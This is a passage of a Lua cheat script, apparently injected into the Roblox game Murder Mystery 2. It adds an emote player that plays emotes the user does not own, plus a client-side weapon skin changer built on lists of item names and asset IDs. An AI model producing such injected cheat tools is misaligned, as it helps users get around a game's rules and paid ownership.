        if rawLower == "wave" or rawLower == "laugh" or rawLower == "cheer" or rawLower == "point" then
            local played = pcall(function() return hum:PlayEmote(rawLower) end)
            if played then
                _G.RanaxEmoteActive = true
                return
            end
        end

        -- 3. Custom / Non-MM2 Animation Track load (Kazotsky Kick, CaramellDansen, Default Dance, etc.)
        local is_r15 = isR15(char)
        local animId = is_r15 and (data.R15 or data.R6) or (data.R6 or data.R15)
        if not animId then return end

        local anim = Instance.new("Animation")
        anim.AnimationId = animId

        local animator = hum:FindFirstChildOfClass("Animator") or hum
        local ok, track = pcall(function() return animator:LoadAnimation(anim) end)
        if ok and track then
            local loopMode = (_G.RanaxEmoteLoop ~= false)
            track.Priority = Enum.AnimationPriority.Action
            track.Looped = loopMode
            local spd = tonumber(_G.RanaxEmoteSpeed) or 1.0
            track:Play(0.15)
            track:AdjustSpeed(spd)

            _currentTrack = track
            _G.RanaxCurrentEmoteTrack = track
            _G.RanaxEmoteActive = true

            -- Emote Glitcher/Spammer loop
            if _G.RanaxEmoteSpammer then
                _spammerThread = task.spawn(function()
                    while _G.RanaxEmoteActive and _G.RanaxEmoteSpammer do
                        if _currentTrack and _currentTrack.IsPlaying then
                            _currentTrack.TimePosition = 0.05
                        end
                        task.wait(0.06)
                    end
                end)
            end
        end
    end
    _G.RanaxPlayEmote = playEmoteInternal

    local function toggleEmoteInternal()
        if _G.RanaxEmoteActive then
            stopEmoteInternal()
            notify("Emotes", "Stopped emote 🛑", 1.5)
        else
            playEmoteInternal(_G.RanaxSelectedEmote)
            notify("Emotes", "Playing " .. tostring(_G.RanaxSelectedEmote) .. " 🎭", 1.5)
        end
    end
    _G.RanaxToggleEmote = toggleEmoteInternal

    -- Cleanup on death or respawn
    LocalPlayer.CharacterAdded:Connect(function()
        if _G.RanaxEmoteActive then
            stopEmoteInternal()
        end
    end)

    -- Hotkey listener
    UserInputService.InputBegan:Connect(function(input, gpe)
        if gpe or UserInputService:GetFocusedTextBox() then return end
        local bind = KeybindValues.EmoteKeybind
        if bind and bind ~= "None" and bind ~= "" then
            if input.KeyCode and input.KeyCode.Name == bind then
                toggleEmoteInternal()
            end
        end
    end)

    -- ==================== UI SECTION IN MISCTAB ====================
    MiscTab:Divider()
    MiscTab:Section({ Title = "🎭 Emote Player", TextSize = 15 })

    local EmoteDropdown = MiscTab:Dropdown({
        Title = "Select Emote",
        Desc = "Choose an MM2 or custom dance emote to play",
        Values = emoteOrder,
        Value = _G.RanaxSelectedEmote,
        Multi = false,
        AllowNone = false,
        Callback = function(opt)
            _G.RanaxSelectedEmote = opt
            if _G.RanaxEmoteActive then
                playEmoteInternal(opt)
            end
        end
    })

    local PlayEmoteBtn = MiscTab:Button({
        Title = "Play Emote",
        Desc = "Plays the selected emote (works even if unowned!)",
        Icon = "play",
        Callback = function()
            playEmoteInternal(_G.RanaxSelectedEmote)
            notify("Emotes", "Playing " .. tostring(_G.RanaxSelectedEmote) .. " 🎭", 1.5)
        end
    })

    local StopEmoteBtn = MiscTab:Button({
        Title = "Stop Emote",
        Desc = "Stops the currently playing emote",
        Icon = "square",
        Callback = function()
            stopEmoteInternal()
            notify("Emotes", "Stopped emote 🛑", 1.5)
        end
    })

    local LoopEmoteToggle = MiscTab:Toggle({
        Title = "Loop Emote",
        Desc = "Repeats the emote continuously until stopped",
        Icon = "repeat",
        Type = "Checkbox",
        Value = _G.RanaxEmoteLoop,
        Callback = function(state)
            _G.RanaxEmoteLoop = state
            if _currentTrack and _currentTrack.IsPlaying then
                _currentTrack.Looped = state
            end
        end
    })

    local EmoteWalkToggle = MiscTab:Toggle({
        Title = "Emote Walk (Moonwalk)",
        Desc = "Allows walking and running while emoting without cancelling",
        Icon = "footprints",
        Type = "Checkbox",
        Value = _G.RanaxEmoteWalk,
        Callback = function(state)
            _G.RanaxEmoteWalk = state
        end
    })

    local EmoteSpeedSlider = MiscTab:Slider({
        Title = "Emote Speed",
        Desc = "Adjusts animation playback speed multiplier",
        Step = 0.1,
        Value = {
            Min = 0.1,
            Max = 3.0,
            Default = 1.0,
        },
        Callback = function(v)
            _G.RanaxEmoteSpeed = v
            if _currentTrack and _currentTrack.IsPlaying then
                pcall(function() _currentTrack:AdjustSpeed(v) end)
            end
        end
    })

    local EmoteSpammerToggle = MiscTab:Toggle({
        Title = "Emote Glitcher / Spammer",
        Desc = "Rapidly loops animation frame for glitchy jitter effect",
        Icon = "zap",
        Type = "Checkbox",
        Value = false,
        Callback = function(state)
            _G.RanaxEmoteSpammer = state
            if state and _G.RanaxEmoteActive and not _spammerThread then
                _spammerThread = task.spawn(function()
                    while _G.RanaxEmoteActive and _G.RanaxEmoteSpammer do
                        if _currentTrack and _currentTrack.IsPlaying then
                            _currentTrack.TimePosition = 0.05
                        end
                        task.wait(0.06)
                    end
                end)
            elseif not state and _spammerThread then
                task.cancel(_spammerThread)
                _spammerThread = nil
            end
        end
    })

    local EmoteKeybind = MiscTab:Keybind({
        Title = "Emote Keybind",
        Desc = "Toggle play/stop for selected emote (Delete for None)",
        Value = KeybindValues.EmoteKeybind or "None",
        Callback = function(v)
            local keyName = tostring(v):gsub("Enum.KeyCode.", "")
            if keyName == "Delete" or keyName == "Backspace" or keyName == "None" or v == nil then
                KeybindValues.EmoteKeybind = "None"
                pcall(function() if EmoteKeybind and EmoteKeybind.SetValue then EmoteKeybind:SetValue("None") end end)
            else
                KeybindValues.EmoteKeybind = keyName
            end
        end
    })
    UIElements.EmoteKeybind = EmoteKeybind
end

-- ==================== RANAX SKIN CHANGER SYSTEM (GODLY & CHROMA WEAPONS) ====================
task.wait()
local SkinChangerTab = Window:Tab({
    Title = "Skin Changer",
    Icon = "sparkles",
    Locked = false,
})

do
    local _skinChanger = {
        KnifeEnabled = true,
        GunEnabled = true,
        SelectedKnife = "Scythe",
        SelectedGun = "Harvester",
        ChromaRainbow = false,
        ChromaSpeed = 1.0,
        CustomAura = "None",
        GlowEnabled = false,
        GlowColor = Color3.fromRGB(255, 0, 128),
        WeaponScale = 1.0,
    }

    local GlowColorMap = {
        ["Neon Pink"] = Color3.fromRGB(255, 0, 128),
        ["Cyan Blue"] = Color3.fromRGB(0, 220, 255),
        ["Electric Green"] = Color3.fromRGB(0, 255, 120),
        ["Golden Yellow"] = Color3.fromRGB(255, 215, 0),
        ["Blood Red"] = Color3.fromRGB(255, 20, 20),
        ["Purple Violet"] = Color3.fromRGB(170, 0, 255),
        ["Pure White"] = Color3.fromRGB(255, 255, 255),
    }

    -- Curated default list of Godly, Ancient, Vintage, and Chroma knives
    local DefaultKnifeList = {
        "AmericaSword",
        "AuroraKnife",
        "BattleAxe",
        "BattleAxe2",
        "BaubleKnife",
        "BaubleKnifeChroma",
        "Bioblade",
        "Bloom",
        "BlueSeer",
        "Boneblade",
        "BonebladeChroma",
        "Candleflame",
        "CandleflameChroma",
        "Candy",
        "Celestial",
        "Chill",
        "Clockwork",
        "Cookieblade",
        "Darksword",
        "Deathshard",
        "DeathshardChroma",
        "Eggblade",
        "ElderwoodKnife",
        "ElderwoodKnifeChroma",
        "ElderwoodScythe",
        "Eternal",
        "Eternal2",
        "Eternal3",
        "Eternal4",
        "EternalCane",
        "Fang",
        "FangChroma",
        "Flames",
        "FlowerwoodKnife",
        "Frostbite",
        "Frostsaber",
        "Gemstone",
        "GemstoneChroma",
        "Ghostblade",
        "Gingerblade",
        "GingerbladeChroma",
        "Gingermint_K",
        "Gingermint_KChroma",
        "Hallow",
        "HallowsBlade",
        "Hallowscythe",
        "Handsaw",
        "Heartblade",
        "HeartWand",
        "HeartWandChroma",
        "Heat",
        "HeatChroma",
        "Icebreaker",
        "IceDragon",
        "Iceflake",
        "IceShard",
        "Icewing",
        "Logchopper",
        "Nebula",
        "Nightblade",
        "NikKnife",
        "OrangeSeer",
        "Pearl_K",
        "Peppermint",
        "Phantom2022",
        "Pixel",
        "Plasmablade",
        "Prismatic",
        "Pumpking",
        "PurpleSeer",
        "Rainbow_K",
        "RedSeer",
        "Sakura_K",
        "Saw",
        "SawChroma",
        "Scythe",
        "SeerChroma",
        "Slasher",
        "SlasherChroma",
        "SnowDagger",
        "SnowDaggerChroma",
        "Snowflake",
        "SnowstormChroma",
        "Spider",
        "SunsetKnife",
        "SunsetKnifeChroma",
        "SweetChroma",
        "SwirlyAxe",
        "SwirlyBlade",
        "TheSeer",
        "Tides",
        "TidesChroma",
        "TravelerAxe",
        "TreeKnife2023",
        "TreeKnife2023Chroma",
        "Turkey2023",
        "UFOKnife",
        "UFOKnifeChroma",
        "VampireAxe",
        "VampiresEdge",
        "Virtual",
        "Waves_K",
        "WintersEdge",
        "WraithKnife",
        "XenoKnife",
        "Xmas",
        "YellowSeer",
        "ZombieBat"
    }

    local DefaultGunList = {
        "Amerilaser",
        "AuroraGun",
        "Bauble",
        "BaubleChroma",
        "Blaster",
        "BlizzardChroma",
        "Blossom_G",
        "ChromaDarkbringer",
        "ChromaLightbringer",
        "Constellation",
        "ConstellationChroma",
        "Darkbringer",
        "Darkshot",
        "ElderwoodGun",
        "Flora",
        "FlowerwoodGun",
        "GingerLuger",
        "Gingermint_G",
        "Gingerscope",
        "GreenLuger",
        "Hallowgun",
        "Harvester",
        "Icebeam",
        "Iceblaster",
        "Icepiercer",
        "Jinglegun",
        "Laser",
        "LaserChroma",
        "Lightbringer",
        "Luger",
        "Lugercane",
        "LugerChroma",
        "Makeshift",
        "Minty",
        "Ocean_G",
        "Pearl_G",
        "Plasmabeam",
        "Rainbow_G",
        "Raygun",
        "RaygunChroma",
        "RedLuger",
        "Shark",
        "SharkChroma",
        "Snowcannon",
        "SnowcannonChroma",
        "Spectre2022",
        "Sugar",
        "SunsetGun",
        "SunsetGunChroma",
        "SwirlyGun",
        "SwirlyGunChroma",
        "TravelerGun",
        "TravelerGunChroma",
        "TreatChroma",
        "TreeGun2023",
        "TreeGun2023Chroma",
        "VampireGun",
        "VampireGunChroma",
        "Watergun",
        "WatergunChroma",
        "WraithGun",
        "XenoGun"
    }

    local KnifeOptions = {}
    local GunOptions = {}
    local seenKnives = {}
    local seenGuns = {}

    for _, k in ipairs(DefaultKnifeList) do
        if not seenKnives[k] then seenKnives[k] = true; table.insert(KnifeOptions, k) end
    end
    for _, g in ipairs(DefaultGunList) do
        if not seenGuns[g] then seenGuns[g] = true; table.insert(GunOptions, g) end
    end

    -- Run deep scan in background thread after 5s so inject has 0 FPS drop!
    task.spawn(function()
        task.wait(5)
        local dynK, dynG = scanReplicatedStorageWeapons()
        for _, k in ipairs(dynK) do
            if not seenKnives[k] then seenKnives[k] = true; table.insert(KnifeOptions, k) end
        end
        for _, g in ipairs(dynG) do
            if not seenGuns[g] then seenGuns[g] = true; table.insert(GunOptions, g) end
        end
    end)

    -- Deep-search for weapon source model or parts in ReplicatedStorage or other players
    local function findWeaponSource(weaponName)
        if not weaponName or weaponName == "" then return nil end
        local target = nil

        pcall(function()
            local weaponsFolder = ReplicatedStorage:FindFirstChild("Weapons")
            if weaponsFolder then
                target = weaponsFolder:FindFirstChild(weaponName, true)
            end

            if not target then
                for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
                    if desc.Name == weaponName and (desc:IsA("Model") or desc:IsA("Tool") or desc:IsA("Part") or desc:IsA("MeshPart")) then
                        target = desc
                        break
                    end
                end
            end

            -- Fallback: Check if another player in the server is holding it
            if not target then
                for _, p in ipairs(Players:GetPlayers()) do
                    if p ~= LocalPlayer and p.Character then
                        local held = p.Character:FindFirstChild(weaponName)
                        if held and (held:IsA("Tool") or held:IsA("Model")) then
                            target = held
                            break
                        end
                    end
                end
            end
        end)

        return target
    end

    -- Clean up previous visual modifications on a tool
    local MeeqWeaponDatabase = {
    ["Gingerscope"] = { MeshId = "rbxassetid://15374602183", TextureId = "rbxassetid://15409041564", Type = "Gun" },
    ["Harvester"] = { MeshId = "rbxassetid://7775027413", TextureId = "http://www.roblox.com/asset/?id=7775245551", Type = "Gun" },
    ["Icepiercer"] = { MeshId = "rbxassetid://11868991644", TextureId = "rbxassetid://11869075814", Type = "Gun" },
    ["Amerilaser"] = { MeshId = "http://www.roblox.com/asset/?id=116657254", TextureId = "https://www.roblox.com/asset/?id=445884341", Scale = Vector3.new(0.7, 0.7, 0.7), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["BaubleChroma"] = { MeshId = "rbxassetid://107813118898769", TextureId = "rbxassetid://137012201908941", Scale = Vector3.new(0.0471, 0.0471, 0.0471), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["Bauble"] = { MeshId = "rbxassetid://107813118898769", TextureId = "rbxassetid://137012201908941", Scale = Vector3.new(0.0471, 0.0471, 0.0471), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["Blaster"] = { MeshId = "http://www.roblox.com/asset/?id=92656610", TextureId = "https://www.roblox.com/asset/?id=386269992", Scale = Vector3.new(0.4, 0.45, 0.5), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["BlizzardChroma"] = { MeshId = "rbxassetid://77235373292363", TextureId = "rbxassetid://110354859513948", Scale = Vector3.new(0.04334, 0.04334, 0.04334), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["Blossom_G"] = { MeshId = "rbxassetid://12322809632", TextureId = "rbxassetid://12322809917", Scale = Vector3.new(0.04763, 0.04413, 0.04382), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["AuroraGun"] = { MeshId = "rbxassetid://16070198638", TextureId = "rbxassetid://107873598804292", Type = "Gun" },
    ["ConstellationChroma"] = { MeshId = "rbxassetid://124598402927958", TextureId = "rbxassetid://123603327635244", Scale = Vector3.new(0.10123, 0.10123, 0.10123), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["Constellation"] = { MeshId = "rbxassetid://124598402927958", TextureId = "rbxassetid://79010754957272", Type = "Gun" },
    ["Darkbringer"] = { MeshId = "rbxassetid://4730813852", TextureId = "rbxassetid://4728494788", Scale = Vector3.new(0.03841, 0.035, 0.035), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["ChromaDarkbringer"] = { MeshId = "rbxassetid://4730813852", TextureId = "rbxassetid://4728494788", Scale = Vector3.new(0.03639, 0.035, 0.035), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["Darkshot"] = { MeshId = "", TextureId = "", Type = "Gun" },
    ["ElderwoodGun"] = { MeshId = "rbxassetid://4210029922", TextureId = "http://www.roblox.com/asset/?id=4210038158", Type = "Gun" },
    ["TreeGun2023Chroma"] = { MeshId = "rbxassetid://15408864925", TextureId = "rbxassetid://15694616343", Scale = Vector3.new(0.021, 0.021, 0.0205), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["TreeGun2023"] = { MeshId = "rbxassetid://15408864995", TextureId = "rbxassetid://15408849730", Type = "Gun" },
    ["Flora"] = { MeshId = "rbxassetid://108253816085047", TextureId = "rbxassetid://116621225933096", Type = "Gun" },
    ["FlowerwoodGun"] = { MeshId = "rbxassetid://16895099893", TextureId = "rbxassetid://16895448237", Type = "Gun" },
    ["GingerLuger"] = { MeshId = "http://www.roblox.com/asset/?id=95356090", TextureId = "rbxassetid://2702668339", Scale = Vector3.new(1.8, 1.8, 1.8), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["Gingermint_G"] = { MeshId = "rbxassetid://11866444071", TextureId = "rbxassetid://11866444253", Scale = Vector3.new(0.04606, 0.04606, 0.04606), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["GreenLuger"] = { MeshId = "http://www.roblox.com/asset/?id=95356090", TextureId = "http://www.roblox.com/asset/?id=126534866", Scale = Vector3.new(1.8, 1.8, 1.8), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(0, 1, 0), Type = "Gun" },
    ["Hallowgun"] = { MeshId = "rbxassetid://5841866437", TextureId = "http://www.roblox.com/asset/?id=5841868338", Type = "Gun" },
    ["Icebeam"] = { MeshId = "rbxassetid://8310908064", TextureId = "rbxassetid://8231066536", Type = "Gun" },
    ["Iceblaster"] = { MeshId = "rbxassetid://6125828567", TextureId = "rbxassetid://6120563948", Type = "Gun" },
    ["Jinglegun"] = { MeshId = "rbxassetid://6125843704", TextureId = "rbxassetid://6125843755", Scale = Vector3.new(1, 1, 1), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["LaserChroma"] = { MeshId = "rbxassetid://130099641", TextureId = "rbxassetid://3171220436", Scale = Vector3.new(0.5, 0.5, 0.5), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["Laser"] = { MeshId = "http://www.roblox.com/asset?id=130099641", TextureId = "http://www.roblox.com/asset?id=161254231", Scale = Vector3.new(0.5, 0.5, 0.5), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["Lightbringer"] = { MeshId = "rbxassetid://4730813852", TextureId = "http://www.roblox.com/asset/?id=4728487789", Scale = Vector3.new(0.039, 0.039, 0.039), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["ChromaLightbringer"] = { MeshId = "rbxassetid://4730813852", TextureId = "rbxassetid://5278764604", Scale = Vector3.new(0.03639, 0.035, 0.035), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["Luger"] = { MeshId = "http://www.roblox.com/asset/?id=95356090", TextureId = "http://www.roblox.com/asset/?id=126534866", Scale = Vector3.new(1.8, 1.8, 1.8), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["LugerChroma"] = { MeshId = "rbxassetid://95356090", TextureId = "rbxassetid://3171206966", Scale = Vector3.new(1.8, 1.8, 1.8), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["Lugercane"] = { MeshId = "rbxassetid://95356090", TextureId = "rbxassetid://4835358188", Scale = Vector3.new(1.8, 1.8, 1.8), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["Makeshift"] = { MeshId = "rbxassetid://11158364935", TextureId = "http://www.roblox.com/asset/?id=11274360089", Type = "Gun" },
    ["Minty"] = { MeshId = "rbxassetid://4528424409", TextureId = "rbxassetid://4528424475", Type = "Gun" },
    ["Ocean_G"] = { MeshId = "rbxassetid://13928587755", TextureId = "rbxassetid://13928590054", Scale = Vector3.new(0.07872, 0.04308, 0.04678), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["Pearl_G"] = { MeshId = "rbxassetid://18280804203", TextureId = "rbxassetid://18280805635", Type = "Gun" },
    ["Plasmabeam"] = { MeshId = "rbxassetid://9702755186", TextureId = "rbxassetid://10015208201", Scale = Vector3.new(0.04235, 0.04632, 0.04392), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["Rainbow_G"] = { MeshId = "rbxassetid://12921221200", TextureId = "rbxassetid://12921231088", Type = "Gun" },
    ["RaygunChroma"] = { MeshId = "rbxassetid://115447220952926", TextureId = "rbxassetid://127881437685243", Scale = Vector3.new(0.0472, 0.0472, 0.0472), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["Raygun"] = { MeshId = "rbxassetid://115447220952926", TextureId = "rbxassetid://127881437685243", Type = "Gun" },
    ["RedLuger"] = { MeshId = "http://www.roblox.com/asset/?id=95356090", TextureId = "http://www.roblox.com/asset/?id=126534866", Scale = Vector3.new(1.8, 1.8, 1.8), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 0.2, 0.3), Type = "Gun" },
    ["SharkChroma"] = { MeshId = "rbxassetid://118269783", TextureId = "rbxassetid://3171214838", Scale = Vector3.new(0.44, 0.44, 0.44), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["Shark"] = { MeshId = "http://www.roblox.com/asset/?id=118269783", TextureId = "rbxassetid://1106696354", Scale = Vector3.new(0.44, 0.44, 0.44), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["Snowcannon"] = { MeshId = "rbxassetid://99836890880541", TextureId = "rbxassetid://122392330922281", Type = "Gun" },
    ["SnowcannonChroma"] = { MeshId = "rbxassetid://99836890880541", TextureId = "rbxassetid://84894022221722", Scale = Vector3.new(0.04964, 0.04964, 0.04964), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["WraithGun"] = { MeshId = "rbxassetid://79527507796407", TextureId = "rbxassetid://80102752403085", Type = "Gun" },
    ["Spectre2022"] = { MeshId = "rbxassetid://11165536294", TextureId = "rbxassetid://11165715120", Scale = Vector3.new(0.05246, 0.05246, 0.05246), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["Sugar"] = { MeshId = "http://www.roblox.com/asset/?id=101086719", TextureId = "http://www.roblox.com/asset/?id=101086650", Scale = Vector3.new(0.5, 0.5, 0.5), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["SunsetGun"] = { MeshId = "rbxassetid://109742397574153", TextureId = "rbxassetid://71731808219690", Scale = Vector3.new(0.04585, 0.04585, 0.04585), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["SunsetGunChroma"] = { MeshId = "rbxassetid://109742397574153", TextureId = "rbxassetid://71731808219690", Scale = Vector3.new(0.0471, 0.0471, 0.0471), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["SwirlyGunChroma"] = { MeshId = "rbxassetid://8310911339", TextureId = "rbxassetid://10044501316", Scale = Vector3.new(1, 1, 1), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["SwirlyGun"] = { MeshId = "rbxassetid://8310911339", TextureId = "rbxassetid://8293539377", Type = "Gun" },
    ["TravelerGun"] = { MeshId = "rbxassetid://15090814396", TextureId = "rbxassetid://15090814672", Type = "Gun" },
    ["TravelerGunChroma"] = { MeshId = "rbxassetid://15090814396", TextureId = "rbxassetid://15090814672", Scale = Vector3.new(0.04839, 0.0491, 0.04924), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["TreatChroma"] = { MeshId = "rbxassetid://135790480817772", TextureId = "rbxassetid://71260815789113", Scale = Vector3.new(0.05384, 0.05384, 0.05384), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["VampireGun"] = { MeshId = "rbxassetid://126591885289479", TextureId = "rbxassetid://104946799389637", Type = "Gun" },
    ["VampireGunChroma"] = { MeshId = "rbxassetid://126591885289479", TextureId = "rbxassetid://104946799389637", Scale = Vector3.new(0.05, 0.05, 0.05), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["WatergunChroma"] = { MeshId = "rbxassetid://18280999342", TextureId = "rbxassetid://18281003313", Scale = Vector3.new(0.03947, 0.03947, 0.03947), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Gun" },
    ["Watergun"] = { MeshId = "rbxassetid://18280999342", TextureId = "rbxassetid://18281003313", Scale = Vector3.new(0.03947, 0.03947, 0.03947), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Gun" },
    ["XenoGun"] = { MeshId = "rbxassetid://96867436912658", TextureId = "rbxassetid://103568875118220", Type = "Gun" },
    ["Scythe"] = { MeshId = "http://www.roblox.com/asset/?id=305826272", TextureId = "rbxassetid://2511673515", Scale = Vector3.new(1, 1, 1), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Celestial"] = { MeshId = "rbxassetid://109711282082830", TextureId = "rbxassetid://79010754957272", Type = "Knife" },
    ["ElderwoodScythe"] = { MeshId = "rbxassetid://4217523241", TextureId = "http://www.roblox.com/asset/?id=4210044808", Type = "Knife" },
    ["Hallowscythe"] = { MeshId = "rbxassetid://5841877975", TextureId = "http://www.roblox.com/asset/?id=5841879647", Type = "Knife" },
    ["Icebreaker"] = { MeshId = "rbxassetid://6124173614", TextureId = "rbxassetid://6124173821", Type = "Knife" },
    ["Icewing"] = { MeshId = "rbxassetid://3183449780", TextureId = "rbxassetid://2279588369", Scale = Vector3.new(0.085, 0.085, 0.085), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Logchopper"] = { MeshId = "http://www.roblox.com/asset?id=4535643726", TextureId = "rbxassetid://5211110240", Scale = Vector3.new(0.96, 0.96, 0.96), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["NikKnife"] = { MeshId = "http://www.roblox.com/asset/?id=305826272", TextureId = "rbxassetid://2533345412", Scale = Vector3.new(1, 1, 1), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["SwirlyAxe"] = { MeshId = "rbxassetid://8293463844", TextureId = "rbxassetid://8293464070", Type = "Knife" },
    ["TravelerAxe"] = { MeshId = "rbxassetid://15057341638", TextureId = "rbxassetid://15057460725", Type = "Knife" },
    ["VampireAxe"] = { MeshId = "rbxassetid://92263601594064", TextureId = "rbxassetid://73008954478338", Type = "Knife" },
    ["UFOKnife"] = { MeshId = "rbxassetid://86649405964534", TextureId = "rbxassetid://94763497877100", Type = "Knife" },
    ["UFOKnifeChroma"] = { MeshId = "rbxassetid://86649405964534", TextureId = "rbxassetid://94763497877100", Scale = Vector3.new(0.07697, 0.07697, 0.07697), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["AuroraKnife"] = { MeshId = "rbxassetid://16025287191", TextureId = "rbxassetid://97521579968070", Type = "Knife" },
    ["ZombieBat"] = { MeshId = "rbxassetid://11182796403", TextureId = "rbxassetid://11192090515", Type = "Knife" },
    ["BattleAxe"] = { MeshId = "rbxassetid://1084767698", TextureId = "rbxassetid://1084767901", Scale = Vector3.new(0.56, 0.56, 0.56), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["BattleAxe2"] = { MeshId = "rbxassetid://2397016406", TextureId = "rbxassetid://2513526862", Type = "Knife" },
    ["Bioblade"] = { MeshId = "rbxassetid://4662600017", TextureId = "http://www.roblox.com/asset/?id=4751538400", Type = "Knife" },
    ["Bloom"] = { MeshId = "rbxassetid://73266355643345", TextureId = "rbxassetid://103489229144925", Type = "Knife" },
    ["BlueSeer"] = { MeshId = "http://www.roblox.com/asset?id=156092238", TextureId = "rbxassetid://3184062977", Scale = Vector3.new(0.7, 0.91, 1), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Boneblade"] = { MeshId = "rbxassetid://1857106669", TextureId = "rbxassetid://2516324337", Scale = Vector3.new(0.7, 0.7, 0.7), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["BonebladeChroma"] = { MeshId = "rbxassetid://1857106669", TextureId = "rbxassetid://2513578115", Scale = Vector3.new(0.73, 0.73, 0.73), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["Candleflame"] = { MeshId = "rbxassetid://7791364860", TextureId = "rbxassetid://7791364988", Type = "Knife" },
    ["CandleflameChroma"] = { MeshId = "rbxassetid://7791364860", TextureId = "rbxassetid://7806078587", Scale = Vector3.new(0.06, 0.06, 0.06), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Chroma = true, Type = "Knife" },
    ["Candy"] = { MeshId = "http://www.roblox.com/asset/?id=19040337", TextureId = "http://www.roblox.com/asset/?id=19040326", Scale = Vector3.new(1.1, 1.4, 1.1), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Chill"] = { MeshId = "http://www.roblox.com/asset/?id=105329941", TextureId = "http://www.roblox.com/asset/?id=105978218", Scale = Vector3.new(0.5, 0.5, 0.5), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Clockwork"] = { MeshId = "http://www.roblox.com/asset/?id=352571495", TextureId = "http://www.roblox.com/asset/?id=352570357", Scale = Vector3.new(1.1, 1.6, 1.2), Offset = Vector3.new(0, 0, 0), VertexColor = Vector3.new(1, 1, 1), Type = "Knife" },
    ["Cookieblade"] = { MeshId = "rbxassetid://6123168377", TextureId = "rbxassetid://6123168583", Type = "Knife" },
